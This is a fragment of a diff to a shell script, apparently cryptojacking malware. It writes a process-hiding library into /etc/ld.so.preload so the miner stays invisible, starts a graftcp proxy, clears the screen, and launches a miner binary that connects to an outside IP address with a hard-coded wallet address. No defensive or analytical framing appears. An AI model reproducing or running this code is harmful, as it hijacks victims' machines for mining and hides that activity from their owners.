@@ -58,4 +58,3 @@ mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
 ./graftcp/graftcp & clear & ./GM3.30 -a firo -s 164.90.139.77:80 -u aBzsYiZ1AJ7SDTyL4o4FmdNipWE5qAx3kk.$(shuf -n 1 -i 1-3000)-Bismillah
-
